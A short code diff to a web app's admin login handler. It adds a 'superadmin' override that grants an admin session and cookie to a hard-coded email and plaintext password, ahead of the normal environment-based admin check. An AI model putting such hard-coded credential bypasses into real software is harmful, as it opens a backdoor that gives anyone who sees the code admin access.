@@ -36,6 +36,14 @@ export default async function handler(req, res) {
   const inputEmail = (email || '').trim().toLowerCase();
   const inputPassword = (password || '').trim();
 
+  // 0. Superadmin direct login override
+  if (inputEmail === 'dudefromalhiem@gmail.com' && inputPassword === 'vanguardian123') {
+    const payload = { id: 'admin-super', email: inputEmail, role: 'admin' };
+    const token = await createAdminSession(payload);
+    setAdminCookie(res, token);
+    return success(res, { message: 'Admin logged in successfully', user: payload });
+  }
+
   for (const [k, v] of Object.entries(envAdmins)) {
     const keyClean = k.replace(/['"{} ]/g, '').trim().toLowerCase();
     const valClean = String(v).replace(/['"{} ]/g, '').trim();
